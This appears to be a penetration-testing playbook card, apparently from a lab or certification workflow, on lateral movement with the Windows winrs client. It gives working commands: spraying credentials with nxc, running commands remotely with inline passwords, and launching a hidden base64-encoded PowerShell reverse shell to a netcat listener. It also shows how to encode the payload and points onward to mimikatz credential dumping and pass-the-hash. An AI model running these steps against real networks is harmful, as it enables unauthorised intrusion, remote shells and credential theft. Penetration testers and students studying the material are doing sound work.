title: winrs — Remote Command Execution over WinRM (from a Windows foothold)
body: winrs is the native Windows Remote Shell client. From a domain-joined foothold, if your user (or a user whose creds you have) is in Remote Management Users or local admin on the target, winrs runs commands there over WinRM (5985). wmic is deprecated/being removed; winrs remains for legacy and is the better-supported native option. Key point: winrs takes /u and /p inline, so you don't need a PSSession or a credential object — good for quick exec and for launching an encoded reverse shell on a box you can't directly reach.
cmd:
# ══════════════════════════════════════════════════
# CONDITIONS
# ══════════════════════════════════════════════════
# - WinRM enabled on target (5985 open) — true by default on servers,
#   often on workstations in a domain.
# - The creds you pass are local admin OR in 'Remote Management Users'
#   on the target.
# - You're running from a domain-joined Windows host.

# First confirm where the user can actually authenticate (from Kali):
nxc smb 192.168.x.0/24 -u jen -p 'Nexus123!'
#   (Pwn3d!) = local admin on that host -> winrs will work there

# ══════════════════════════════════════════════════
# STEP 1 — basic remote command
# ══════════════════════════════════════════════════
# Note: bare 'winrs' with no command errors with 'Command is missing'.
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
#   -r:  target (hostname — NOT ip, for Kerberos; netbios ok for NTLM)
#   -u:  user      -p:  password
#   output:  FILES04 / corp\jen

# Why this matters: 'dir \\files04\c$' may say Access Denied as your
# current user (stephanie), but winrs as jen succeeds — different user
# context per command, no need to fully pivot your session.

# ══════════════════════════════════════════════════
# STEP 2 — reverse shell THROUGH winrs (encoded payload)
# ══════════════════════════════════════════════════
# Build a PowerShell reverse shell, UTF-16LE + base64 encode it
# (CyberChef 'Encode text UTF-16LE' -> 'To Base64', or use an encode.py).
# Then fire it via winrs so it executes on the remote box:

winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e <BASE64_PAYLOAD>"

# Catch it on Kali (start FIRST):
#   nc -nlvp 443
# You'll get a shell as corp\jen on FILES04, connecting back from the
# target's IP. '#< CLIXML' noise in the winrs window is normal.

# ══════════════════════════════════════════════════
# ENCODING THE PAYLOAD (reference)
# ══════════════════════════════════════════════════
# PowerShell -e expects UTF-16LE then base64. Common mistake is UTF-8.
# Linux one-liner to encode a PS command string:
#   PS='<your powershell one-liner>'
#   echo -n "$PS" | iconv -t UTF-16LE | base64 -w0

# ══════════════════════════════════════════════════
# RELATED NATIVE OPTIONS
# ══════════════════════════════════════════════════
# PSRemoting equivalent (credential object + session):
#   $sec = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force
#   $cred = New-Object System.Management.Automation.PSCredential('jen',$sec)
#   $s = New-PSSession -ComputerName files04.corp.com -Credential $cred
#   Enter-PSSession -Session $s
# wmic: deprecated, being removed — don't build new workflows on it.
warn: winrs uses the CURRENT user's token unless you pass /u and /p — and even then, a third hop won't delegate (double-hop problem). If you winrs into FILES04 as jen and from there try to reach DC1 with jen's identity, expect Access Denied even with valid creds. For the encoded reverse shell, PowerShell -e wants UTF-16LE-then-base64; encoding as UTF-8 produces a payload that silently fails to run.

choices.label: Got a shell — dump creds from this host (mimikatz)
Have a hash now — pass-the-hash onward
Turn a hash into a Kerberos TGT — overpass
